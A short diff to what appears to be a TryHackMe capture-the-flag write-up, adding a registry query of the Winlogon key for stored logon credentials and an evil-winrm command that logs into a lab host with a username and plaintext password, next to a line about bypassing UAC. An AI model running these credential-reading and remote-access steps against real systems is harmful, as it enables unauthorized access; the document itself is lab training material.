@@ -233,6 +233,16 @@ hugo
 
 
 
+```
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+```
+
+```
+evil-winrm -i 10.10.15.209 -u 'hugo' -p 'SurpriseMF123!' 
+```
+
+
+
 Bypass UAC to run program with Administrator privilege.
 
 {% embed url="https://0xb0b.gitbook.io/writeups/tryhackme/2023/avenger" %}
